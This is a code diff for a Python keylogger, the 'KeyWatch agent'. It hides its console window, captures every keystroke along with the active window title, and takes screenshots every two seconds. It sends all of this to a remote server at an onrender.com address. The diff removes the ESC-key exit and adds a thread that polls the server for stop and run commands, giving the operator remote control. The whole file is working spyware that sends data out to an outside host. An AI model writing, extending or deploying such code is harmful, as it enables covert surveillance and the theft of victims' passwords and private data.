@@ -14,14 +14,16 @@ from PIL import ImageGrab
 # ─────────────────────────────────────────────
 #  CONFIGURATION — update BASE_URL before use
 # ─────────────────────────────────────────────
-BASE_URL       = "https://keylogger-hwdc.onrender.com/"  # ← Replace with your Render URL
+BASE_URL       = "https://keylogger-hwdc.onrender.com"  # ← Replace with your Render URL
 SERVER_URL     = f"{BASE_URL}/log"
 SCREENSHOT_URL = f"{BASE_URL}/screenshot"
+COMMAND_URL    = f"{BASE_URL}/command"
 
 LOG_DIR  = "keylogger_logs"
 LOG_FILE = os.path.join(LOG_DIR, "keylogger.log")
 
-SCREENSHOT_INTERVAL = 2   # seconds between screenshots (set 0 to disable)
+SCREENSHOT_INTERVAL = 2  # seconds between screenshots
+POLL_INTERVAL       = 5   # seconds between command polls
 
 # ─────────────────────────────────────────────
 os.makedirs(LOG_DIR, exist_ok=True)
@@ -32,18 +34,19 @@ logging.basicConfig(
     filename=LOG_FILE,
 )
 
-running    = True
+running   = True   # overall process running
+paused    = False  # True = keylogger paused by server command
 send_queue = queue.Queue()
+listener_ref = None  # holds the pynput Listener so we can stop/restart it
 
 
 # ── Hide console window ───────────────────────
-# Works when run as .py or compiled .exe
-# Hides immediately on launch — no visible window
+
 def hide_console():
     try:
         hwnd = ctypes.windll.kernel32.GetConsoleWindow()
         if hwnd:
-            ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0
+            ctypes.windll.user32.ShowWindow(hwnd, 0)
     except Exception:
         pass
 
@@ -70,6 +73,9 @@ def format_key(key) -> str:
 
 def on_press(key):
     global running
+    if paused:
+        return  # drop keystrokes while paused
+
     timestamp    = time.strftime('%Y-%m-%d %H:%M:%S')
     window_title = get_active_window()
     key_str      = format_key(key)
@@ -80,36 +86,54 @@ def on_press(key):
         "key":       key_str,
     })
 
-    if key == keyboard.Key.esc:
-        running = False
-        return False
-
-
 def on_release(key):
     pass
 
 
 # ── Network sender thread ─────────────────────
-# Runs separately — never blocks keyboard capture
 
 def sender_thread():
     while True:
         try:
             payload = send_queue.get(timeout=1)
-            try:
-                requests.post(SERVER_URL, json=payload, timeout=5)
-            except requests.exceptions.RequestException as e:
-                logging.warning(f"Failed to send keystroke: {e}")
-            finally:
-                send_queue.task_done()
+            if not paused:
+                try:
+                    requests.post(SERVER_URL, json=payload, timeout=5)
+                except requests.exceptions.RequestException as e:
+                    logging.warning(f"Failed to send keystroke: {e}")
+            send_queue.task_done()
         except queue.Empty:
             if not running:
                 break
 
 
+# ── Command poll thread ───────────────────────
+# Polls /command every POLL_INTERVAL seconds.
+# Sets paused=True when server says "stop",
+# sets paused=False when server says "run".
+
+def command_thread():
+    global paused
+    while running:
+        try:
+            r   = requests.get(COMMAND_URL, timeout=5)
+            cmd = r.json().get("command", "run")
+            if cmd == "stop" and not paused:
+                paused = True
+                logging.info("Agent paused by server command")
+            elif cmd == "run" and paused:
+                paused = False
+                logging.info("Agent resumed by server command")
+        except Exception as e:
+            logging.warning(f"Command poll failed: {e}")
+        time.sleep(POLL_INTERVAL)
+
+
 # ── Screenshot thread ─────────────────────────
 
 def send_screenshot():
+    if paused:
+        return
     try:
         img = ImageGrab.grab()
         max_width = 1280
@@ -131,7 +155,6 @@ def send_screenshot():
 
 
 def monitor_thread():
-    global running
     while running:
         try:
             if SCREENSHOT_INTERVAL > 0:
@@ -144,21 +167,17 @@ def monitor_thread():
 # ── Entry point ───────────────────────────────
 
 if __name__ == "__main__":
-    # Hide console window immediately on launch
     hide_console()
-
     logging.info("KeyWatch agent started")
 
-    # Sender thread — handles all HTTP calls
-    sender = threading.Thread(target=sender_thread, daemon=True)
-    sender.start()
+    # Background threads
+    threading.Thread(target=sender_thread,  daemon=True).start()
+    threading.Thread(target=monitor_thread, daemon=True).start()
+    threading.Thread(target=command_thread, daemon=True).start()
 
-    # Monitor thread — screenshots
-    monitor = threading.Thread(target=monitor_thread, daemon=True)
-    monitor.start()
-
-    # Keyboard listener — blocks until ESC or shutdown
+    # Keyboard listener — runs until shutdown
     with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener_ref = listener
         listener.join()
 
     logging.info("KeyWatch agent stopped")
